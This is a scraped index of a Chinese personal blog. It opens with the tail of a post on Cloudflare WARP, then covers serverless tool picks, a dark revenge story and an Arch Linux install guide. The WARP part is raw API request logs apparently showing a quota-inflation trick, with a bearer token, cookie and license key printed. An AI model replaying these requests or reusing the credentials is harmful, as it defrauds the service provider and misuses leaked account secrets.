Oct 2023 06:30:21 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive CF-Ray: 813492f7c9a696c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-envoy-upstream-service-time: 4098 Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=Qy8emNDUPCJGcbD5y2yy04auosZBfIsuUKdFzv13Qu6YVCHItE%2BWjBtf6G2NBL9UcW2uaLGM6C0RJzmLg80ITaN0yKA%2BmiGPRBxU70VOfJIr1aZo7jurHbycP%2FiaKrc5tD2VBeOaesI90A%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;2b4d3261-ad36-4069-95ea-53520cd42a58\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;0001-01-01T00:00:00Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:20.041792568Z\u0026#34;,\u0026#34;premium_data\u0026#34;:0,\u0026#34;quota\u0026#34;:0,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:0,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;} PUT /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Content-Type: application/json; charset=UTF-8 Authorization: Bearer 40ca084f-315e-45e2-9191-b59199c2331a Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= Content-Length: 41 {\u0026#34;license\u0026#34;: \u0026#34;7O95xNh3-81E65Kce-W4ln892I\u0026#34;} HTTP/1.1 200 OK Date: Mon, 09 Oct 2023 06:30:23 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive CF-Ray: 81349313896196c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-envoy-upstream-service-time: 1211 Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=0drwc3hjXQSCR2MN19A9gx%2BF3frLTlL76tvd1viYTqf3tTU0Js%2FdM3eoyqU%2FL0py%2FoPJYAJsZTemfGo%2BYsEuVLddoeEJ%2BzaE9RECqldUdGpuskVjquX3RMqoD5UtMAWdXsjtiR5mB7Wagw%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;b55baa96-a450-4332-9f39-f3046b6ea86a\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;0001-01-01T00:00:00Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:23.027025975Z\u0026#34;,\u0026#34;premium_data\u0026#34;:24598563000000000,\u0026#34;quota\u0026#34;:24598563000000000,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:24598563,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;} GET /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739/account HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Authorization: Bearer 40ca084f-315e-45e2-9191-b59199c2331a Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= HTTP/1.1 200 OK Date: Mon, 09 Oct 2023 06:30:23 GMT Content-Type: application/json; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive CF-Ray: 8134931d99d396c0-SJC CF-Cache-Status: DYNAMIC Vary: Accept-Encoding x-envoy-upstream-service-time: 199 Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=UUOYPQkNQWPKUfe6SGnsX8qgZ4yYrd%2FvoiX83NpDNYALCUunDdWYN9NL6SQHLhxzSCv%2FRyPWDEIL7q16wtOGVWrR39hbCZsKH4IA%2FFObYgmb7C6m0HHC3eCQxvn6eqxV9L77U7T8rumrBQ%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Server: cloudflare Content-Encoding: gzip {\u0026#34;id\u0026#34;:\u0026#34;b55baa96-a450-4332-9f39-f3046b6ea86a\u0026#34;,\u0026#34;account_type\u0026#34;:\u0026#34;limited\u0026#34;,\u0026#34;created\u0026#34;:\u0026#34;2023-10-09T06:30:12.82392Z\u0026#34;,\u0026#34;updated\u0026#34;:\u0026#34;2023-10-09T06:30:23.027025Z\u0026#34;,\u0026#34;premium_data\u0026#34;:24598563000000000,\u0026#34;quota\u0026#34;:24598563000000000,\u0026#34;warp_plus\u0026#34;:true,\u0026#34;referral_count\u0026#34;:24598563,\u0026#34;referral_renewal_countdown\u0026#34;:0,\u0026#34;role\u0026#34;:\u0026#34;child\u0026#34;,\u0026#34;license\u0026#34;:\u0026#34;7O95xNh3-81E65Kce-W4ln892I\u0026#34;} DELETE /v0a2223/reg/0b831bf3-224d-4d45-869b-b59edd27e739 HTTP/1.1 Host: api.cloudflareclient.com Accept: */* CF-Client-Version: a-6.11-2223 Connection: Keep-Alive Accept-Encoding: gzip User-Agent: okhttp/3.12.1 Authorization: Bearer 40ca084f-315e-45e2-9191-b59199c2331a Cookie: __cf_bm=Fy2G.5O4ravUG7amYkVN3pFXyXviJwPUOkSrgy47_so-1696833013-0-AcoPy8M7MrOFuI+c74qOYNs875Cp/we0MEq6M/wdlySHgOigyzY5f3+52sIv12h9pB+WV55CalcoCwYkuN3VQSo= HTTP/1.1 204 No Content Date: Mon, 09 Oct 2023 06:30:25 GMT Connection: keep-alive Report-To: {\u0026#34;endpoints\u0026#34;:[{\u0026#34;url\u0026#34;:\u0026#34;https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=0xOQ2ahaxjRl6A1krBHDAP33evulwaakRrFst09ItQ%2BIsWyQ7rkeTFyNhYd39BMFXc2wR6ULCRtVuRhbY8BhXZGv1XegNl%2Bm6d2%2Fz7%2FkMX6LhBtAJYb9Bz1GGdooOhWiKUy3GbIlK3bDjw%3D%3D\u0026#34;}],\u0026#34;group\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} NEL: {\u0026#34;success_fraction\u0026#34;:0,\u0026#34;report_to\u0026#34;:\u0026#34;cf-nel\u0026#34;,\u0026#34;max_age\u0026#34;:604800} Vary: Accept-Encoding Server: cloudflare CF-RAY: 813493218d1396c0-SJC 总结 最后，感谢您的耐心观看，愿您生活愉悦。\n参考文献 yonggekkk/warp-yg - Github WarpKey-Register-PRO - Replit rwkgyg/CFwarp - Gitlab How to get free 12PB to Your Warp Key [BUG / BUFF] WarpKeyGen - Replit ","date":"2023-10-09T14:29:43+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20231009/webpageheadimageCloudflare_54117147.6hbl4terqlj4.webp","permalink":"https://blog.moeomu.com/zh-cn/posts/cloudflare-warp-%E8%BF%B7%E8%B8%AA/","title":"Cloudflare Warp 迷踪"},{"content":"本文来源: MoeomuBlog\n前言 如果您打算使用 Vercel，请先 fork 原始项目后部署。在 GitHub 上，您可以轻松地将上游项目更新到您的 fork 中。\nRSSHub Github: DIYgod/RSSHub\n简介 RSSHub 是一款开源、易用、可扩展的 RSS 源聚合器，它能够从几乎所有内容生成 RSS 源。\nRSSHub 提供从各种来源聚合的数百万条内容，我们充满活力的开源社区确保 RSSHub 的新路线、新功能和错误修复的交付。\n优点 无服务器部署 不收取额外费用 第三方全文 RSS 抓取 支持大量网站 我的观点 如果您想随时了解新闻并接收来自任何平台的实时更新，您可以通过这项服务来实现。它易于设置，是摆脱信息审查和信息孤岛的最佳选择。\n评分: 9/10\numami Github: umami-software/umami\n简介 Umami 是一款简单、快速、注重隐私的 Google Analytics 替代软件。\n优点 无服务器部署 不收取额外费用 保护客人的隐私不受 Google 和其他实体的侵犯。 缺点 需要一个数据库。 解决方案： 使用无服务器数据库： PlanetScale\n我的观点 正如它所描述的那样，这是一款方便的访客分析工具，易于部署。修改 JavaScript 文件名后，可将其插入任何位置。\n评分: 7/10\nOnedrive-Index Github: iRedScarf/onedrive-index\n简介 使用 onedrive-vercel-index 在 OneDrive 中展示、共享、预览和下载文件。\n优点 无服务器部署 不收取额外费用 与他人共享文件 缺点 无人积极维护 原始项目已存档 我的观点 方便地从 OneDrive 共享文件，一旦设置好，就无需再担心，因为它会顺利运行。\n评分: 6/10\nPicx Github: XPoet/picx\n简介 基于 GitHub API 和 jsDelivr 开发的 CDN 加速图像托管管理工具。无需下载或安装，可通过网页浏览器在线使用。它免费、稳定、方便，而且快如闪电。\n优点 无服务器部署 无额外费用 图像存储 缺点 无英文翻译 我的观点 您可以在这里放置博客图片，还可以免费使用 CDN 加速，确保获得最佳流畅体验。\n评分: 7/10\n参考文献 RSSHub - Docs ","date":"2023-09-29T16:32:43+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20230929/webpageheadimageServerless_92298688.751yj4pxk328.webp","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%97%A0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8E%A8%E8%8D%90/","title":"无服务器开源项目推荐"},{"content":"本文来源: MoeomuBlog\n背景 这是我的一场梦，梦里的逻辑和情节自然是有缺失，略微将它修正后奉出，希望读到的朋友可以喜欢。本文情节略显黑暗，是一篇复仇故事，同时也是一篇悲剧，如果不喜欢请让我知道，谢谢！\n和异国将军相爱相杀，十年前他杀了我所有的亲人，十年后我灭了他的国。将他送我的流云匕首，插进了他的心脏。\n十年前 将军身旁的巨人卫士如同钢铁山岳般巨大无比，挥舞着双锤将我的家乡毁灭。我永远记得爷爷临死前被撕裂的残缺的身体，和看着我绝望的眼神。我吓得浑身发抖，躲在巨大岩石旁，祈求着不被发现。不幸的是，我和少数幸存者们被抓到了监狱，路上被一个裹得严严实实的军官检查了所有口袋。将军此战大胜。仇恨的种子在心中发芽，我狠狠盯着来监狱查看战利品的他，他的眼神无情如刀锋，神情冷淡得像万载冰山。他并没有看到我，他的眼里只有战争和荣耀。\n我开始策划越狱。和身旁的狱友商量如何逃出时，她说她有一把小刀，可以切断这不太牢靠的锁。她还是低估了这看似简单的锁的坚韧。一阵尝试之后，我们放弃了。不知道该做什么的我下意识摸了一下口袋，里面似乎有一颗末影珍珠。虽然不知道为什么，但是知道它可以用来传送。我立刻毫不犹豫地向着铁窗外扔去，不出所料，眼前经历了一阵眩晕后来到了监狱之外。\n十年间 浑身脏兮兮的我被好心人家收养，从此又有了家。可惜的是好景不长，兵戈交加的战乱年代里，一家人在逃难时互相失散。为了活下去我便开始在小酒馆以卖唱为生，有幸被正在街头为了凝聚人心从而开展平民选秀的皇家宫廷乐队看中，成为皇家歌舞团的一员。\n这些年我逐渐学会了歌舞，阶层突然间的飞跃让我不太适应，却也让我有心力做一些其他的事情。例如同时学会了如何讨贵族们欢心，如何用眼波流转，一颦一笑勾动他们的心弦和欲望。除此之外，我还用剩下的时间在修道院帮忙，与修女们私交甚好，从而获得修习医术的机会。修女们告诉我一定要小心行事，用善良作为行事准则，否则一定会招来瘟疫，那是神罚，是毁灭性的天灾。\n果然，将军受皇室要求来到皇宫来看宫廷歌舞。他的容貌依旧冷峻，蓝色的眼睛如同深邃的天空般迷人。是夜，舞，曼妙绝伦，歌，优美动听。他的眉眼望着领舞的我，似乎拥了温情。从那天开始，他数次私下找我，却都被我以各种理由拒绝，却和他开始了信件交流。\n他越来越想见我，于是请了皇室到他的公爵封地做客，皇家乐团自然跟去助兴。夜，宴席结束，我在路上突然被侍卫拦下，带到了将军的会客厅。看到我进来，他如锋的剑眉舒展开来，深邃的靛蓝色双目温情脉脉，看着我：“怎么一直不肯来？担忧什么吗？”我立即作出委屈的表情：“我真的很怕。”他温柔地将我搂到怀里，我没有反抗。“怕我吗？”“嗯。”“现在呢？”“不太怕了。”我看着他迷人的眼睛，他轻轻吻了我的额头。\n我们私下的关系越来越好，见面越来越频繁，眼见他眼里看着我的炽热从火苗变成熊熊烈火，我也许很快就能复仇了。我在心里默默比较着这些年积累的杀人方法，最终决定毒杀他。我根据修道院藏书馆的记载，决定用一种被称为普鲁士蓝的颜料分离出kcn，听说极其剧毒。我向修女学习了一些简单的化学方法，另外跟将军撒娇说想画画，他托人购买了数量极为巨大的绘画用颜料给我。我随后在家中用书里的方法自己提取出一些kcn，随后小心密封，心里想着也许以后会有用。\n一次又一次的约会让我们都成为了对彼此最熟悉的人，除了我的童年记忆。他搂着我，在夜空之下赏花，似乎有些醉意。“我好看还是花好看？”我问得甜腻。“你的微笑比玫瑰美丽，你的眼眸如同湛蓝的海洋。每一次目光交汇，我都无法移开眼睛，你就是我最美的花园。”他温柔诉说的情意，让人沉沦其中无法自拔。那刻，我幻想着如果能够不背负仇恨，我们本应该多么开心。虽然，这男人的心难测，有时会略微冷漠一些，有时却热情如火。\n他又一次约我出游，将一个长方形的红木礼盒拿了出来，细腻的雕刻和金色的外观让它看起来像是一件无与伦比的精致艺术品。我惊喜地打开礼盒，里面有一把精致的匕首。象牙做的乳白色刀柄闪着光晕，银丝和宝石镶嵌其间，像一朵朵流云般飘逸，看起来分外精致。“我不需要，你拿回去吧。”打开盒子看到礼物的我气极，这也太直男了，真不愧是公爵将军。“这是定情信物，我爱你，我真的很想和你结婚。”他的语气中似乎有点着急。“我的地位，只可能成为你的情妇。”我笑着对他说。“我只能这样答应。”他的神情似乎有些窘迫，我从未见到这样的神情在他这样的人脸上出现过。他接着说：“我和家族讨论了，他们不会支持，但是我可以不在乎自己的声誉和利益。”我抚摸着他的脸：“为我，值得吗？”随后立刻亲了上去堵住了他的嘴，防止他再说什么。\n看着他送给我的定情匕首，我也同时看到了他眼中的真挚与温柔，那一刻我不得不承认，自己多年来对他的感情已然扭曲。在他的房间，他让我看了他的很多日记本，他是个很喜欢喝茶的人，我之后的日子里四处找了许多正宗的东洋茶，制作了精美的包装送给他。他好像一直一直在埋怨我不肯让他走进我的内心。\n现在 我托人在当地购买了一批老鼠，又将从遥远闹鼠疫的国度购买的老鼠血注射到它们体内，随后放归城市。我知道它们会很痛苦，是啊，我也一样。我抚摸着其中一个小可爱喃喃自语：“我们真的都一样呢，都一样呢，再忍一下就好，就要结束了。”我在自己的地下秘密实验室的门口，看着实验室地板上的脚印，意识到似乎有人进入过，但是也无所谓了，无论是谁都不重要，老鼠已经全部放走，结局已经注定。\n最后的一次约会，我趁他出门迎接贵客，把曾经制作的白色固体取出一些，就在将要倒入时，我犹豫了。复杂的感情涌入我的脑海，他和我的欢喜，我们的感情，和这个世界，这一切都不重要了，我决意复仇。白色固体被我放到了他常常喝茶的杯子中，即刻溶化，有少许的苦杏仁味，混合在茶水的香味中若隐若现，希望他闻不到。我做完这一切，颓然地跌坐到了地上，任泪水翻涌，夺眶而出。\n他回来时，我已然整理好自己的情绪。他坐下后温柔抱我到他的身上，又端起那杯茶，像往常一样欣赏着茶香，随后将那杯茶水一饮而尽。他突然腹痛难忍地将我放下，叫我去请医生，我反手将那把随身携带的定情匕首插入他的心脏。他看着我的眼神闪过震惊、迷离和痛苦，似乎终于想起来什么，用尽最后的力气说了两个字：“口袋”。我白了他一眼，我穿的裙子哪来的口袋。眼前突然云雾变幻，我陷入回忆，想起曾经的监狱中，下意识地摸口袋，发现的那颗曾经救我的末影珍珠，又想起那个裹得严严实实的军官，原来是你，但是，为什么？\n头上一阵剧痛袭来，我昏倒了过去。再次醒来时，身处公爵城堡监狱。“王子殿下，那刺客舞姬在这里，公爵已死。”“好。”我似乎听到了有人说话的声音，突然一阵惊恐穿过心头，如此熟悉的声音，他怎么可能没死？？？为什么侍卫叫他王子？多年宫廷表演养成的强大心理素质让我能够轻易稳定情绪，我立刻重新表现得极为优雅，等待着离奇的宿命。\n那张熟悉却陌生的脸骤然出现却突然将我的一切优雅打碎。我不死心却又开心，复杂的情感差一点将我彻底吞噬：“为什么，你为什么还活着？”他冷峻的面容没有一丝波澜：“你杀死的是我弟弟，我们是双胞胎”。他进入牢房，捏着我的下颌，冷淡的表情似乎有一丝笑容：“你做得很好，所以接下来你想怎么死？火刑还是铁处女？”我看着他的脸，棱角分明，冷漠无情，我明白了。我突然笑得又癫又疯：“是啊，十年前，女巫岭下，原来是你！原来不是他！”他依旧没有任何表情，眉头略微簇了一下就放开了，似乎明白了我为什么会突然吼十年前的往事。\n他让守卫退下，一身铁镣的我显然无法对他产生任何威胁。他坐在椅子上，问我：“你不想知道为什么吗？”我：“你到底是谁？”他淡淡地说：“你的确足够天真，你配合我完成了完美的杀戮，我得到这个地位需要感谢你。”他接着说：“你杀的是王子。我们同时对你产生了兴趣，显然他和你一样天真，陷得更深也更惨，巫女之后可真是名不虚传。”我：“这几年间，和我在一起的，到底是你们之间的谁？”他轻轻笑着：“有时是我，有时是他，所以你到现在都分辨不出来？那个傻瓜十年前假扮我的军官四处散发末影珍珠，我还因此笑过他太仁慈，几个奴隶跑了倒是无所谓，死于奴隶之手就是可笑了。此外，我有个疑问，毒药已经足够杀了他，甚至可以让你全身而退，为什么多此一举？他可能闻不到那种味道，我能闻到，我知道那是毒药。”我盯着他湛蓝却冷漠的眼睛看了一会，随后扭过头，拒绝回答。他接着说道：“你那拙劣的提取手段，在自己家中都能留下那么多痕迹，我找朋友检查了一下就明白你居心叵测，于是将计就计利用了你，却确实没想到你是那个逃走的奴隶。”\n离开之前，他嘱咐守卫午饭后将我拖去公众行刑场，处以火刑。我在狱中笑得癫狂，你真的以为杀了我就万事大吉，国家稳固？是啊，我也曾以为自己是猎手，如今却发现自己是猎物。公众行刑台上，我依旧笑得随性不羁。他走近火刑架，问我：“就这么结束了？你不是挺聪明的吗？”我望向远方聚集的人群，唇边带着微笑：“结束了吗？不，这才刚开始。”“你给我说清楚，否则…”他的声音中透出一丝不耐。我转头看向他，眼中三分怜悯七分玩味：“否则什么？你除了杀我还能做什么？你以为杀了我，就能逃过审判？你送给我的罪名是女巫是吗，那我诅咒这座城市，诅咒你。””你究竟还干了什么？“他眉头深锁，几欲爆发。但我笑而不语，重新望向远方，仿佛在湛蓝的天空中寻找什么。在他真正失去耐性之际，我缓缓闭目，任由火焰吞噬自己，享受我亲手为自己设计的死亡颂歌。\n故事终\n","date":"2023-09-27T20:00:20+08:00","image":"https://cdn.statically.io/gh/Misakaou/imagestorage@master/20230929/webpageheadimageLiterature_84636833.3nwqlcfdnx4w.5zkk04m0znnk.webp","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%A2%A6%E5%BF%86-%E6%A2%A6%E8%8B%A5%E6%B5%AE%E7%94%9F%E6%88%91%E6%AC%B2%E5%90%9B/","title":"梦忆-梦若浮生，我欲君"},{"content":"本文来源: MoeomuBlog\n本文简介 Asus Strix ScarG532\n如果您和我是一样的机器那么完全可以遵循本文一步一步地执行命令，最终一定会成功安装ArchLinux。我会详尽地将参考资料链接在旁边，您可以查看和修改成您想要的配置。 上面这条说明有违Arch之道，所以我是在开玩笑。请勿一步一步遵循下文配置，如果您遇到了和我一样的问题，您可以参考我的解决方案 我所安装的组件内容如下 安全启动组件：PreLoader 启动引导程序：systemd-boot 网络和DHCP服务：NetworkManager (因为与Gnome集成更好) 桌面环境：Gnome based on Wayland 中文输入：ibus-libpinyin based on ibus (因为与Gnome集成更好) 安装ArchLinux 这一节完全遵循Installation guide - ArchWiki，您可以查看此官方文档链接获得更详细的解释\n预安装 启动盘制作 您可以访问Download - ArchLinux页面来获取官方启动镜像 下载好后推荐使用balenaEtcher将镜像写入U盘 从U盘启动制作好的ArchLinux安装环境系统 这三步由于过于简单所以不多赘述，如果需要帮助请在评论区留言\n验证UEFI模式启动 执行命令ls /sys/firmware/efi/efivars，如果有输出值那么证明是UEFI模式启动，后文中引导程序将使用UEFI\n检查并连接网络 下文将使用无线网卡进行网络连接\n执行rfkill，如果输出如下则证明硬件正常 1 2 3 ID TYPE DEVICE SOFT HARD 0 bluetooth hci0 unblocked unblocked 1 wlan phy0 unblocked unblocked 执行iwctl进入网络连接配置工具界面，更多内容查看iwctl - ArchWiki 执行device list查看设备列表 执行station wlan0 scan使用wlan0设备进行扫描 执行station wlan0 get-networks查看扫描到的网络列表 执行station wlan0 connect SSID连接网络 执行ping archlinux.org检测网络连接情况 校准时间 systemd-timesyncd检测到网络连接将会自动校准时间，因此不需要手动校准时间\n执行timedatectl status查看并确保系统时间正确 磁盘操作(数据无价，务必谨慎操作) 本节是一定不可以照搬的，您的磁盘数量可能和我不一样，您的磁盘分区情况也一定和我不一样\n务必参考Partition the disks - ArchWiki进行磁盘分区\n执行fdisk -l查看磁盘分区情况，按照您的需要自己分区 执行fdisk /dev/nvme0n1进行第一块SSD的操作，按m显示帮助，操作完成后保存退出fdisk界面，此工具在保存时才会写入硬盘分区表，请放心操作 (危险)执行mkfs.ext4 /dev/nvme0n1p4格式化第一块SSD的第四个分区，在本例中将会是/的挂载点 (危险)执行mkfs.ext4 /dev/nvme2n1p1格式化第三块SSD的第一个分区，在本例中将会是/home的挂载点 执行e2label /dev/nvme0n1p4 \u0026quot;ArchSys\u0026quot;将第一块SSD的第四个分区的标签设置为ArchSys，systemd-boot将会用到它 执行e2label /dev/nvme2n1p1 \u0026quot;ArchData\u0026quot;将第三块SSD的第一个分区的标签设置为ArchData，systemd-boot将会用到它 执行blkid | grep Arch查看磁盘标签的设置情况 执行mount /dev/nvme0n1p4 /mnt挂载磁盘，它将会是/ 执行mount --mkdir /dev/nvme0n1p1 /mnt/boot挂载磁盘，它将会是/boot 执行mount --mkdir /dev/nvme2n1p1 /mnt/home挂载磁盘，它将会是/home 执行mkswap /dev/nvme0n1p5格式化第一块SSD的第五个分区为内存交换分区 执行swapon /dev/nvme0n1p5启用内存交换分区 开始安装 修改选择镜像地址 vim是一款命令行文本编辑器，如果不会用的话可以换为nano，如果已经进入了vim界面，可以在普通模式下输入英文冒号和q退出vim\n执行vim /etc/pacman.d/mirrorlist编辑安装源镜像列表 将本行Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch加到最上方，或者可以遵循自己的习惯 安装必须的包 intel-ucode是intel的微码更新包，推荐安装\n执行pacstrap -K /mnt base linux linux-firmware intel-ucode安装系统基础包 执行pacstrap /mnt networkmanager bluez vim sudo bash-completion openssh man git wget zsh安装一些自己需要的软件 配置新系统 执行genfstab -U /mnt \u0026gt;\u0026gt; /mnt/etc/fstab创建系统分区表定义 执行arch-chroot /mnt将shell切换到新系统中执行命令 执行ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime将系统时区设置为亚洲-上海 执行hwclock --systohc同步硬件时间 执行vim /etc/locale.gen编辑系统的本地化设置，我的设定如下，可以作为参考。注意：如果在这一步中不添加zh_CN.UTF-8 UTF-8，那么在Gnome的Keyboard选项中会找不到拼音输入 1 2 en_US.UTF-8 UTF-8 zh_CN.UTF-8 UTF-8 执行locale-gen生成本地化设置 执行vim /etc/locale.conf编辑语言配置文件，我使用英文系统，输入了LANG=en_US.UTF-8，如果使用中文系统，改成LANG=zh_CN.UTF-8 执行vim /etc/hostname编辑本主机名称 执行mkinitcpio -P创建启动内存初始化镜像 执行passwd修改root用户密码 配置系统启动项 执行bootctl --path=/boot install将systemd-boot安装到/boot中 执行systemctl enable systemd-boot-update.service启动systemd-boot的自动更新服务 执行vim /boot/loader/loader.conf编辑systemd-boot启动配置文件 1 2 3 4 5 6 default archlinux.conf timeout 2 console-mode max editor no auto-entries 1 auto-firmware 1 执行vim /boot/loader/entries/archlinux.conf编辑ArchLinux启动项 1 2 3 4 5 title Arch Linux linux /vmlinuz-linux initrd /intel-ucode.img initrd /initramfs-linux.img options root=\u0026#34;LABEL=ArchSys\u0026#34; rw quiet splash 执行vim /boot/loader/entries/arch-fallback.conf编辑ArchLinux-Fallback启动项 1 2 3 4 5 title Arch Linux (fallback initramfs) linux /vmlinuz-linux initrd /intel-ucode.img initrd /initramfs-linux-fallback.img options root=\u0026#34;LABEL=ArchSys\u0026#34; rw quiet splash 其它 执行systemctl enable NetworkManager.service让NetworkManager的服务开机自启动 执行systemctl enbale bluetooth.service让蓝牙服务开机自启动 执行exit退出新系统环境 执行reboot重新启动系统 提示：到这里其实就可以结束了，但是如果作为主力系统来使用，ArchLinux现在的样子显然不合格，所以下文是更多的软件安装参考\n更多安装配置 连接网络 使用NetworkManager命令行工具\n执行nmcli device wifi list查看wifi列表 执行nmcli device wifi connect SSID_or_BSSID password your_password连接网络 执行nmcli connection show查看当前连接 您可以在nmcli example - ArchWiki文章中查看更多用法\n新建用户 执行useradd -m misaka来新建一个名为misaka的用户 执行export EDITOR=vim \u0026amp;\u0026amp; visudo编辑此文件，按照提示，将新用户添加到特权用户组，让新用户可以正常使用sudo进行提权操作 执行usermod -a -G wheel misaka将misaka用户添加到wheel用户组中，这样做的好处是让Gnome可以正确识别这个新用户的权限，在Gnome中进行root权限操作时默认弹出这个用户名的验证 执行passwd misaka修改新用户的密码 安装图形界面Gnome 提示：下方写的命令要安装的软件很多，是因为Gnome包中有很多我不需要的软件，所以只能手动选择希望安装的软件，您也同样可以用更简单的pacman -S gnome来代替下方的安装命令，随您喜好\n执行下方的命令将安装Gnome的基础组件 pacman -S file-roller gdm gedit gnome-backgrounds gnome-calculator gnome-control-center gnome-disk-utility gnome-logs gnome-menus gnome-settings-daemon gnome-shell gnome-shell-extensions gnome-software gnome-system-monitor gnome-terminal gvfs nautilus seahorse seahorse-nautilus xdg-user-dirs-gtk 如果安装时让您选择使用jack2还是pipewire，请选择pipewire。这是系统的声音服务。\n执行systemctl enable gdm.service让Gnome登陆界面开机自启动，它将会在下一次重启时启动Gnome 安装中文输入法和字体 执行pacman -S ttf-dejavu wqy-zenhei wqy-microhei adobe-source-han-sans-cn-fonts adobe-source-han-serif-cn-fonts安装中文字体 执行ibus ibus-libpinyin安装ibus和ibus的智能拼音输入法 重新启动并以普通用户身份登陆 执行reboot 启动Terminal Gnome窗口控制按钮设置 执行gsettings set org.gnome.desktop.wm.preferences button-layout \u0026quot;close,minimize,maximize:\u0026quot;将会把所有窗口的关闭、最小化、最大化按钮显示出来并放到左侧 NVIDIA驱动设置 警告：本小节执行之中请勿重新启动\n执行sudo pacman -S nvidia nvidia-settings安装NVIDIA显卡驱动和设置程序 它将会把默认的窗口系统从Wayland换成X11，如果想继续使用Wayland作为窗口系统，请执行以下命令\n执行sudo ln -s /dev/null /etc/udev/rules.d/61-gdm.rules禁用udev的在GDM中禁用Wayland的规则 执行gsettings set org.gnome.mutter experimental-features '[\u0026quot;kms-modifiers\u0026quot;]'启用gsettings的kms-modifiers 执行sudo vim /boot/loader/entries/archlinux.conf编辑启动引导项将最后一行改成options root=\u0026quot;LABEL=ArchSys\u0026quot; rw quiet splash nvidia-drm.modeset=1 执行sudo vim /etc/mkinitcpio.conf编辑modsettings将MODULES=()改成nvidia nvidia_modeset nvidia_uvm nvidia_drm并保存文件。更多帮助信息请参考DRM_kernel_mode_setting - ArchWiki 执行sudo mkinitcpio -P 本节参考来源：Use Wayland with proprietary NVIDIA drivers - Manjaro Forum\n安全启动 本节参考来源：Unified Extensible Firmware Interface/Secure Boot - ArchWiki\n从Linux Foundation Secure Boot System Released - James Bottomley\u0026rsquo;s random Pages下载PreLoader.efi和HashTool.efi 如果您按照上文配置，那么将这两个文件复制到您的/boot/EFI/systemd目录中 将/boot/EFI/systemd/systemd-bootx64.efi重命名为/boot/EFI/systemd/loader.efi 1 2 cp your_download_path/{PreLoader,HashTool}.efi esp/EFI/systemd cp esp/EFI/systemd/systemd-bootx64.efi esp/EFI/systemd/loader.efi 执行sudo pacman -S efibootmgr安装efibootmgr 请注意可能您的磁盘和我不同，执行sudo efibootmgr --verbose --disk /dev/nvme0n1 --part 1 --create --label \u0026quot;Arch Linux Security Boot\u0026quot; --loader /boot/EFI/systemd/PreLoader.efi添加一个NVRAM启动条目 安装Gnome扩展程序 执行flatpak install com.mattjakeman.ExtensionManager安装Gnome扩展程序管理器 在Gnome扩展程序管理器中搜索安装并配置下列扩展程序 TrayIcons: Reloaded(强烈推荐) Blur My Shell Gnome Clipboard Compiz 